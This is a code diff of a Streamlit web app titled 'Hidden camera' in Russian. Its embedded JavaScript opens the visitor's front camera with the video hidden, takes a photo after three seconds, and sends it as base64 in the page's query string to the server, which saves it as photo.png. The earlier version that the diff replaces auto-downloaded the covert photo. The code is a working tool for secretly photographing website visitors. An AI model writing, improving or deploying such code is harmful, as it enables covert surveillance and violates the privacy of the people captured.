@@ -1,81 +1,52 @@
 import streamlit as st
 import streamlit.components.v1 as components
+import base64
+import os
 
-# HTML код с JavaScript
+st.set_page_config(page_title="Камера", layout="centered")
+
+st.title("📸 Скрытая камера")
+
+# Обработка фото с фронта
+if st.experimental_get_query_params().get("imgdata"):
+    data_url = st.experimental_get_query_params()["imgdata"][0]
+    header, encoded = data_url.split(",", 1)
+    img_bytes = base64.b64decode(encoded)
+    with open("photo.png", "wb") as f:
+        f.write(img_bytes)
+    st.success("Фото сохранено как photo.png!")
+
+# HTML + JS
 html_code = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Скрытая съемка фото с камеры</title>
-    <style>
-        body {
-            background-color: white; /* Белый фон */
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        #videoElement {
-            display: none; /* Скрыть видео */
-        }
-    </style>
-</head>
-<body>
-    <video id="videoElement" width="640" height="480" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas> <!-- Скрытый canvas -->
-    
-    <script>
-        // Получаем доступ к камере
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const videoElement = document.getElementById('videoElement');
-                videoElement.srcObject = stream;
+<video id="videoElement" width="640" height="480" autoplay style="display: none;"></video>
+<canvas id="canvas" style="display: none;"></canvas>
 
-                // После того как камера запущена и доступ разрешён, делаем снимок
-                videoElement.onplaying = () => {
-                    setTimeout(() => {
-                        capturePhoto();
-                    }, 3000); // Снимает фото через 3 секунды
-                };
-            } catch (error) {
-                console.error("Ошибка доступа к камере:", error);
-                alert("Не удалось получить доступ к камере.");
-            }
-        }
+<script>
+async function startCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('videoElement');
+        video.srcObject = stream;
 
-        // Функция для захвата фото с камеры
-        function capturePhoto() {
-            const videoElement = document.getElementById('videoElement');
-            const canvas = document.getElementById('canvas');
+        video.onplaying = () => {
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imgData = canvas.toDataURL('image/png');
 
-            // Отображаем изображение с видео на canvas (скрыто от пользователя)
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                // Перенаправление с base64 как query
+                window.location.search = "?imgdata=" + encodeURIComponent(imgData);
+            }, 3000);
+        };
+    } catch (e) {
+        alert("Ошибка доступа к камере: " + e);
+    }
+}
 
-            // Преобразуем изображение на canvas в Data URL
-            const dataUrl = canvas.toDataURL('image/png');
-
-            // Создаём ссылку для скачивания фото (автоматически скачает файл)
-            const link = document.createElement('a');
-            link.href = dataUrl;
-            link.download = 'photo.png';
-            link.click();
-        }
-
-        // Запускаем камеру при загрузке страницы
-        startCamera();
-    </script>
-</body>
-</html>
-
+startCamera();
+</script>
 """
 
-# Отображаем HTML в Streamlit
 components.html(html_code, height=600)
